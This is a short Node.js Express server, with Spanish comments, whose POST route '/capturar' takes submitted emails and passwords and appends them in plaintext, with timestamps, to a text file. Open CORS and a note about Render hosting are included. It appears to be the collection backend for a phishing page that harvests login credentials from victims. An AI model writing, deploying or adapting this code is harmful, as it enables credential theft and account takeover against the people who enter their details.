const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(cors());
app.use(express.json());

// Ruta para recibir los datos
app.post('/capturar', (req, res) => {
    const { email, password } = req.body;
    const data = `USUARIO: ${email} | CLAVE: ${password} | FECHA: ${new Date().toLocaleString()}\n`;
    
    // Guardamos en la carpeta js para que coincida con tu estructura
    const filePath = path.join(__dirname, 'base_de_datos.txt');
    
    fs.appendFile(filePath, data, (err) => {
        if (err) {
            console.error("Error al guardar:", err);
            return res.status(500).send("Error interno");
        }
        console.log(">>> Datos recibidos y guardados con éxito!");
        res.status(200).send("Datos capturados");
    });
});

// VITAL: Render asigna el puerto automáticamente
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});